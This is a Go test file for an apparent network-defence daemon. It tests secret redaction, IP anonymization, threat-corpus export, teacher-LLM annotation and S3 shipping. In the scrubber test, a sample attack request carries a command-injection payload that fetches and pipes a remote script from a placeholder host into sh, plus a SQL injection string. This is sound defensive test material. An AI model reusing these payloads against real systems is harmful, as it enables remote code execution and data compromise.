package engine

import (
	"archive/tar"
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/klauspost/compress/zstd"

	axebpf "github.com/axonwall/axonwall/apps/axonwalld/ebpf"
)

func TestScrubThreatPayload(t *testing.T) {
	raw := strings.Join([]string{
		"POST /cgi-bin/luci?cmd=wget+http://198.51.100.44/drop.sh+|+sh&sqli=' OR 1=1-- HTTP/1.1",
		"Authorization: Bearer supersecret_access_token_xyz123456",
		"jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
		"api_key=sk-proj-1234567890abcdefghijklmnop",
		"aws=AKIAIOSFODNN7EXAMPLE",
		"password=MyTopSecretPass99&email=alice@corp.example",
		"card=4111-1111-1111-1111&nonluhn=1234567890123456",
		"-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG\n-----END PRIVATE KEY-----",
	}, "\n")

	scrubbed, count := ScrubThreatPayload(raw)
	if count < 7 {
		t.Fatalf("expected >=7 redactions, got %d; scrubbed:\n%s", count, scrubbed)
	}
	for _, secret := range []string{
		"supersecret_access_token_xyz123456",
		"eyJhbGciOiJIUzI1NiIs",
		"sk-proj-1234567890abcdefghijklmnop",
		"AKIAIOSFODNN7EXAMPLE",
		"MyTopSecretPass99",
		"alice@corp.example",
		"4111-1111-1111-1111",
		"MIIEvQIBADANBgkqhkiG",
	} {
		if strings.Contains(scrubbed, secret) {
			t.Fatalf("secret %q leaked into scrubbed payload:\n%s", secret, scrubbed)
		}
	}
	// Preserve attack syntax for Threat LLM training!
	for _, attackSyntax := range []string{
		"wget+http://198.51.100.44/drop.sh+|+sh",
		"' OR 1=1--",
		"nonluhn=1234567890123456",
	} {
		if !strings.Contains(scrubbed, attackSyntax) {
			t.Fatalf("attack syntax %q was unexpectedly stripped from scrubbed output:\n%s", attackSyntax, scrubbed)
		}
	}
}

func TestCryptoPanAnonymizerPrefixPreservation(t *testing.T) {
	anon, err := NewCryptoPanAnonymizer("test-enterprise-salt-2026", "")
	if err != nil {
		t.Fatalf("NewCryptoPanAnonymizer failed: %v", err)
	}

	a1 := anon.AnonymizeIP("192.168.50.10")
	a2 := anon.AnonymizeIP("192.168.50.99")
	b1 := anon.AnonymizeIP("192.168.51.10")

	if a1 == "192.168.50.10" || a1 == a2 || a1 != anon.AnonymizeIP("192.168.50.10") {
		t.Fatalf("unexpected anonymization output a1=%s a2=%s", a1, a2)
	}

	ipA1 := net.ParseIP(a1).To4()
	ipA2 := net.ParseIP(a2).To4()
	ipB1 := net.ParseIP(b1).To4()
	if ipA1 == nil || ipA2 == nil || ipB1 == nil {
		t.Fatalf("expected valid IPv4 outputs, got %q %q %q", a1, a2, b1)
	}

	// Same /24 MUST share exact anonymized /24 prefix
	if !bytes.Equal(ipA1[:3], ipA2[:3]) {
		t.Fatalf("expected /24 prefix match between %s and %s", a1, a2)
	}
	// Same /16 MUST share /16 prefix while differing in 3rd octet
	if !bytes.Equal(ipA1[:2], ipB1[:2]) || ipA1[2] == ipB1[2] {
		t.Fatalf("expected /16 prefix preservation with distinct /24 octet: %s vs %s", a1, b1)
	}

	// IPv6 /64 prefix preservation
	v6a := anon.AnonymizeIP("2001:db8:abcd:1234::1")
	v6b := anon.AnonymizeIP("2001:db8:abcd:1234::beef")
	if v6a == v6b || !bytes.Equal(net.ParseIP(v6a)[:8], net.ParseIP(v6b)[:8]) {
		t.Fatalf("expected IPv6 /64 prefix preservation: %s vs %s", v6a, v6b)
	}

	dsl := anon.AnonymizeText("FLOW 192.168.50.10 -> 192.168.50.99")
	if !strings.Contains(dsl, a1) || !strings.Contains(dsl, a2) || strings.Contains(dsl, "192.168.50.") {
		t.Fatalf("AnonymizeText failed to rewrite embedded IPv4 literals cleanly: %s", dsl)
	}
}

func TestWriteAndReadThreatParquet(t *testing.T) {
	rows := []ThreatParquetRow{
		{
			EpisodeID:       "ep-1",
			TimestampUnixMs: 1700000000000,
			SrcIP:           "198.51.100.10",
			DstIP:           "192.168.1.250",
			SrcPort:         45123,
			DstPort:         2323,
			Proto:           6,
			PktCount:        12,
			ByteCount:       2048,
			DurationMs:      42.5,
			DnsEntropy:      0.0,
			JA4T:            "29200_2-1460_w7",
			SNI:             "honeypot.local",
			PktSizes:        []int16{-60, 60, -180},
			IatUs:           []uint32{0, 120, 450},
			LabelTier:       "gold_malicious",
		},
		{
			EpisodeID:       "ep-2",
			TimestampUnixMs: 1700000005000,
			SrcIP:           "10.42.0.5",
			DstIP:           "1.1.1.1",
			SrcPort:         51200,
			DstPort:         443,
			Proto:           6,
			PktCount:        8,
			ByteCount:       1400,
			DurationMs:      11.2,
			DnsEntropy:      1.2,
			JA4T:            "64240_2-1460_w7",
			SNI:             "",
			PktSizes:        []int16{60, -60},
			IatUs:           []uint32{0, 100},
			LabelTier:       "benign_sampled",
		},
	}

	var buf bytes.Buffer
	if err := WriteThreatFeatureParquet(&buf, rows); err != nil {
		t.Fatalf("WriteThreatFeatureParquet failed: %v", err)
	}
	meta, err := ReadThreatParquetMetadata(buf.Bytes())
	if err != nil {
		t.Fatalf("ReadThreatParquetMetadata failed: %v", err)
	}
	if meta.Version != 1 || meta.NumRows != 2 {
		t.Fatalf("unexpected Parquet metadata: %+v", meta)
	}
	if len(meta.ColNames) != 16 || meta.ColNames[0] != "episode_id" || meta.ColNames[15] != "label_tier" {
		t.Fatalf("unexpected Parquet schema columns: %v", meta.ColNames)
	}

	// Verify empty 0-row Parquet still writes valid PAR1 framing
	var emptyBuf bytes.Buffer
	if err := WriteThreatFeatureParquet(&emptyBuf, nil); err != nil {
		t.Fatalf("empty WriteThreatFeatureParquet failed: %v", err)
	}
	emptyMeta, err := ReadThreatParquetMetadata(emptyBuf.Bytes())
	if err != nil || emptyMeta.NumRows != 0 {
		t.Fatalf("unexpected empty Parquet metadata: %+v err=%v", emptyMeta, err)
	}
}

func TestTlsUprobeControlPlaneExclusion(t *testing.T) {
	allowAllDangerous := []string{"*", "/usr/sbin/axonwalld", "sshd", "eluvix", "/usr/sbin/haproxy"}
	for _, blocked := range []struct {
		exe  string
		comm string
	}{
		{"/usr/sbin/axonwalld", "axonwalld"},
		{"/usr/sbin/sshd", "sshd"},
		{"/opt/eluvix/bin/eluvix", "node"},
		{"/usr/sbin/slapd", "slapd"},
		{"/usr/local/bin/vault", "vault"},
		{"/usr/local/bin/minio", "minio"},
		{"/usr/local/bin/k3s", "k3s-server"},
		{"/usr/bin/containerd", "containerd"},
		{"/lib/systemd/systemd", "systemd"},
	} {
		if IsBinaryAllowedForTlsUprobe(blocked.exe, blocked.comm, allowAllDangerous, true, true) {
			t.Fatalf("control-plane daemon %s (%s) MUST NEVER be allowed for TLS uprobe", blocked.exe, blocked.comm)
		}
	}

	if !IsBinaryAllowedForTlsUprobe("/usr/sbin/haproxy", "haproxy", allowAllDangerous, false, false) {
		t.Fatalf("explicitly allowlisted haproxy should be permitted")
	}
	if !IsBinaryAllowedForTlsUprobe("/opt/honeypots/cowrie-tls", "python3", nil, true, true) {
		t.Fatalf("honeypot target should be auto-permitted when autoHoneypot=true")
	}
	if IsBinaryAllowedForTlsUprobe("/usr/bin/random-app", "random-app", []string{"*"}, false, false) {
		t.Fatalf("wildcard '*' in allowlist must be ignored safely")
	}
}

func TestThreatHarvesterManagerEndToEnd(t *testing.T) {
	spool := t.TempDir()
	mgr := NewThreatHarvesterManager(nil, nil, nil, nil)
	cfg := DefaultThreatHarvesterConfig()
	cfg.Enabled = true
	cfg.SpoolDir = spool
	cfg.PinGoldEpisodes = true
	cfg.AnonymizeOnExport = true
	cfg.AnonymizationSalt = "unit-test-salt"

	if err := mgr.UpdateConfig(cfg); err != nil {
		t.Fatalf("UpdateConfig failed: %v", err)
	}

	// Inject synthetic episodes: 1 Gold + 3 Silver/Benign
	goldEp, err := mgr.InjectSimulatedEpisode("honeypot_rce_memfd")
	if err != nil {
		t.Fatalf("InjectSimulatedEpisode gold failed: %v", err)
	}
	if goldEp.LabelTier != "gold_malicious" || !goldEp.Pinned || goldEp.RedactionCount == 0 {
		t.Fatalf("unexpected gold episode: %+v", goldEp)
	}
	if strings.Contains(goldEp.ScrubbedPayload, "eyJhbGciOiJIUzI1NiIs") {
		t.Fatalf("JWT leaked in gold episode payload")
	}

	_, err = mgr.InjectSimulatedEpisode("credential_stuffing_redacted")
	if err != nil {
		t.Fatalf("InjectSimulatedEpisode cred failed: %v", err)
	}
	_, err = mgr.InjectSimulatedEpisode("dns_c2_exfil")
	if err != nil {
		t.Fatalf("InjectSimulatedEpisode dns failed: %v", err)
	}
	_, err = mgr.InjectSimulatedEpisode("benign_k3s_egress")
	if err != nil {
		t.Fatalf("InjectSimulatedEpisode benign failed: %v", err)
	}

	// Test raw eBPF ringbuf event correlation -> dark port Gold episode
	var srcBytes [4]byte
	var dstBytes [4]byte
	copy(srcBytes[:], net.ParseIP("198.51.100.88").To4())
	copy(dstBytes[:], net.ParseIP("192.168.10.2").To4())
	ev := axebpf.ThreatHarvesterHarvesterRingEvent{
		TsNs:         uint64(time.Now().UnixNano()),
		SocketCookie: 0xdeadbeef,
		CgroupId:     12345,
		ByteCount:    512,
		SrcV4:        binary.LittleEndian.Uint32(srcBytes[:]),
		DstV4:        binary.LittleEndian.Uint32(dstBytes[:]),
		SrcPort:      44444,
		DstPort:      2323,
		Proto:        6,
		PktCount:     4,
		EventType:    harvesterEvtNetPayload,
		AnomalyFlags: harvesterAnomDarkPort,
		TcpWindow:    29200,
		TcpMss:       1460,
		TcpWscale:    7,
		PayloadLen:   uint16(len("GET /?password=LeakMePlease HTTP/1.1")),
	}
	copy(ev.Payload[:], []byte("GET /?password=LeakMePlease HTTP/1.1"))
	mgr.ingestRingEvent(&ev)
	flushed := mgr.FlushReadyFlows(true)
	if flushed != 1 {
		t.Fatalf("expected 1 flushed dark-port flow, got %d", flushed)
	}

	// Test ExportCorpusTarZst
	var archiveBuf bytes.Buffer
	if err := mgr.ExportCorpusTarZst(&archiveBuf, true); err != nil {
		t.Fatalf("ExportCorpusTarZst failed: %v", err)
	}

	zr, err := zstd.NewReader(&archiveBuf)
	if err != nil {
		t.Fatalf("zstd reader failed: %v", err)
	}
	defer zr.Close()
	tr := tar.NewReader(zr)
	foundFiles := make(map[string][]byte)
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			t.Fatalf("tar Next failed: %v", err)
		}
		data, err := io.ReadAll(tr)
		if err != nil {
			t.Fatalf("tar ReadAll failed: %v", err)
		}
		foundFiles[hdr.Name] = data
	}
	for _, required := range []string{"manifest.json", "train.jsonl", "val.jsonl", "features.parquet"} {
		if _, ok := foundFiles[required]; !ok {
			t.Fatalf("missing %s inside exported .tar.zst corpus", required)
		}
	}
	if strings.Contains(string(foundFiles["train.jsonl"]), "198.51.100.44") || strings.Contains(string(foundFiles["train.jsonl"]), "LeakMePlease") {
		t.Fatalf("anonymized/scrubbed export leaked raw IP or password")
	}
	pqMeta, err := ReadThreatParquetMetadata(foundFiles["features.parquet"])
	if err != nil || pqMeta.NumRows != 5 {
		t.Fatalf("expected 5 rows in exported features.parquet, got meta=%+v err=%v", pqMeta, err)
	}

	// Test Teacher-LLM endpoint + hourly budget
	llmCalls := 0
	llmSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		llmCalls++
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"choices": []map[string]any{
				{
					"message": map[string]string{
						"content": `{"reasoningTrace":"Teacher refined trace","mitreAttack":["T1059"],"recommendedMcpTool":"blackhole_traffic"}`,
					},
				},
			},
		})
	}))
	defer llmSrv.Close()

	// Test S3 SigV4 shipping
	var shippedMethod, shippedAuth, shippedHash string
	var shippedBytes []byte
	s3Srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		shippedMethod = r.Method
		shippedAuth = r.Header.Get("Authorization")
		shippedHash = r.Header.Get("X-Amz-Content-Sha256")
		shippedBytes, _ = io.ReadAll(r.Body)
		w.WriteHeader(http.StatusOK)
	}))
	defer s3Srv.Close()

	cfg.TeacherLlm = ThreatTeacherLlmConfig{
		Enabled:         true,
		Endpoint:        llmSrv.URL,
		Model:           "test-teacher",
		ApiKey:          "test-key",
		MaxCallsPerHour: 1,
	}
	cfg.FleetShipper = ThreatFleetShipperConfig{
		Enabled:      true,
		Endpoint:     s3Srv.URL,
		Region:       "us-east-1",
		Bucket:       "test-vault-bucket",
		Prefix:       "edge-01",
		AccessKey:    "AKIAEXAMPLE",
		SecretKey:    "secretkeyexample",
		UsePathStyle: true,
	}
	if err := mgr.UpdateConfig(cfg); err != nil {
		t.Fatalf("UpdateConfig failed: %v", err)
	}

	updatedEp, err := mgr.AnnotateEpisodeWithTeacherLLM(context.Background(), goldEp.ID)
	if err != nil || updatedEp.ReasoningTrace != "Teacher refined trace" {
		t.Fatalf("Teacher LLM annotation failed: ep=%+v err=%v", updatedEp, err)
	}
	if _, err := mgr.AnnotateEpisodeWithTeacherLLM(context.Background(), goldEp.ID); err == nil {
		t.Fatalf("expected hourly budget error on second Teacher-LLM call")
	}

	objKey, err := mgr.ShipCorpusToS3(context.Background())
	if err != nil {
		t.Fatalf("ShipCorpusToS3 failed: %v", err)
	}
	if shippedMethod != http.MethodPut || !strings.HasPrefix(shippedAuth, "AWS4-HMAC-SHA256 Credential=AKIAEXAMPLE/") || len(shippedHash) != 64 || len(shippedBytes) == 0 || objKey == "" {
		t.Fatalf("unexpected S3 PUT upload: method=%s auth=%s hash=%s bytes=%d key=%s", shippedMethod, shippedAuth, shippedHash, len(shippedBytes), objKey)
	}

	// Test quota eviction preserves Pinned Gold episodes while evicting older unpinned ones
	mgr.mu.Lock()
	mgr.spoolQuotaBytesOverride = 3000 // tight limit smaller than 5 episodes
	evicted := mgr.enforceSpoolQuotaLocked()
	remaining := append([]ThreatEpisode{}, mgr.episodes...)
	mgr.mu.Unlock()

	if evicted == 0 {
		t.Fatalf("expected unpinned episodes to be evicted under tight quota")
	}
	goldSurvived := false
	for _, ep := range remaining {
		if ep.ID == goldEp.ID {
			goldSurvived = true
		}
	}
	if !goldSurvived {
		t.Fatalf("expected pinned Gold episode %s to survive quota eviction; remaining=%d", goldEp.ID, len(remaining))
	}
}
